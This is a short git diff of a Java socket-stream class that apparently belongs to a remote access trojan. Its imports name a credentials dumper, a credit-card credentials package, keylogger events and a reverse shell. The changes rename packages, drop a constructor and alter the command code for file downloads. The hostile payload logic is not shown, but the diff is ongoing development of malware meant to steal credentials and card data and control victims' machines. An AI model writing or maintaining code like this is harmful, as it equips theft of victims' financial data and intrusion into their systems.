@@ -2,8 +2,8 @@ package Connections;
 
 
 import GUI.TableUtils.Connection.ConnectionEnum;
-import GUI.TableUtils.CreditCardsCredentials.CredentialsDumper;
-import GUI.TableUtils.CreditCardsCredentials.Packets.CombinedCredentials;
+import GUI.TableUtils.Credentials.CredentialsDumper;
+import GUI.TableUtils.Credentials.Packets.CombinedCredentials;
 import GUI.TableUtils.KeyLogger.KeyloggerEvents;
 import GUI.TableUtils.Permissions.Permissions;
 import GUI.TableUtils.ReverseShell.Shell;
@@ -46,16 +46,7 @@ public class Streams {
         OutputStream os = socket.getOutputStream();
         dis = new DataInputStream(is);
         dos = new DataOutputStream(os);
-    }
-
-    public Streams(Socket socket, Streams mainStream) throws IOException {
-        if (socket == null) throw new IllegalArgumentException();
-        clientSocket = socket;
-        InputStream is = socket.getInputStream();
-        OutputStream os = socket.getOutputStream();
-        dis = new DataInputStream(is);
-        dos = new DataOutputStream(os);
-        this.mainStream = mainStream;
+        mainStream = this;
     }
 
     public byte[] receiveBytes() throws IOException {
@@ -290,7 +281,7 @@ public class Streams {
         JSONObject jsonObject = new JSONObject();
         switch (action) {
             case DOWNLOAD -> {
-                jsonObject.put("action", 3);
+                jsonObject.put("action", 5);
                 jsonObject.put("file_list", fileList);
                 mainStream.sendString(jsonObject.toString());
             }
